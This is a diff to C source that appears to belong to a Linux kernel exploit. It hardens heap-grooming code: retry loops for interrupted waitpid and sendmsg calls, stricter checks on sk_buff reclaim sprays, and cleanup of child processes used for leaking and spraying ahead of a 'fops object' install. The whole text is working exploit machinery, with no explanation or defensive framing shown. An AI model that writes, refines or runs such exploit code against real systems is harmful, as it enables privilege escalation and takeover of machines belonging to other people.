@@ -138,7 +138,7 @@ static pid_t clone_leak_child(void) {
       _exit(1);
     }
     kernelsnitch_find_collisions(g_ks);
-    exit(0);
+    _exit(0);
   }
   return child;
 }
@@ -153,8 +153,11 @@ static void kill_child(pid_t child) {
   if (child <= 0) {
     return;
   }
-  kill(child, SIGKILL);
-  waitpid(child, NULL, 0);
+  if (kill(child, SIGKILL) != 0 && errno != ESRCH) {
+    return;
+  }
+  while (waitpid(child, NULL, 0) < 0 && errno == EINTR) {
+  }
 }
 
 static int init_ctx(struct mm_ctx *ctx, size_t cnt) {
@@ -399,7 +402,11 @@ static uint64_t groom_and_install_fops_object_impl(
     kill_child(spray_ctx.childs[i]);
     spray_ctx.childs[i] = -1;
   }
-  if (waitpid(child_leak, NULL, 0) < 0) {
+  pid_t leak_waited;
+  do {
+    leak_waited = waitpid(child_leak, NULL, 0);
+  } while (leak_waited < 0 && errno == EINTR);
+  if (leak_waited != child_leak) {
     fprintf(stderr, "[groom] leak child wait failed errno=%d\n", errno);
     goto cleanup;
   }
@@ -452,8 +459,14 @@ static uint64_t groom_and_install_fops_object_impl(
   msg.msg_iov = &iov;
   msg.msg_iovlen = 1;
 
-  if (sendmsg(pcp_sv[0], &msg, 0) < 0) {
-    fprintf(stderr, "[groom] pcp sendmsg failed errno=%d\n", errno);
+  ssize_t pcp_sent;
+  do {
+    pcp_sent = sendmsg(pcp_sv[0], &msg, 0);
+  } while (pcp_sent < 0 && errno == EINTR);
+  if (pcp_sent != (ssize_t)OSS_SKB_SEND_SIZE) {
+    fprintf(stderr,
+            "[groom] pcp sendmsg incomplete sent=%zd want=%d errno=%d\n",
+            pcp_sent, OSS_SKB_SEND_SIZE, pcp_sent < 0 ? errno : 0);
     goto cleanup;
   }
 
@@ -529,20 +542,31 @@ static uint64_t groom_and_install_fops_object_impl(
   size_t drain_triggers = prepare_early_drains + prepare_late_drains;
 
   int reclaim_sent = 0;
+  int reclaim_incomplete = 0;
   for (int i = 0; i < OSS_SKB_RECLAIM_SENDS; i++) {
-    errno = 0;
-    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
-    if (sent <= 0) {
+    ssize_t sent;
+    do {
+      errno = 0;
+      sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
+    } while (sent < 0 && errno == EINTR);
+    if (sent == (ssize_t)OSS_SKB_SEND_SIZE) {
+      reclaim_sent++;
+      continue;
+    }
+    if (sent < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
       break;
     }
-    reclaim_sent++;
+    reclaim_incomplete = 1;
+    break;
   }
   fprintf(stderr,
           "[groom] mm drain triggers=%zu sk_buff reclaim sends=%d/%d\n",
           drain_triggers, reclaim_sent, OSS_SKB_RECLAIM_SENDS);
 
-  if (reclaim_sent == 0) {
-    fprintf(stderr, "[groom] no reclaim skb delivered\n");
+  if (reclaim_sent == 0 || reclaim_incomplete) {
+    fprintf(stderr,
+            "[groom] reclaim batch rejected full=%d incomplete=%d\n",
+            reclaim_sent, reclaim_incomplete);
     goto cleanup;
   }
 
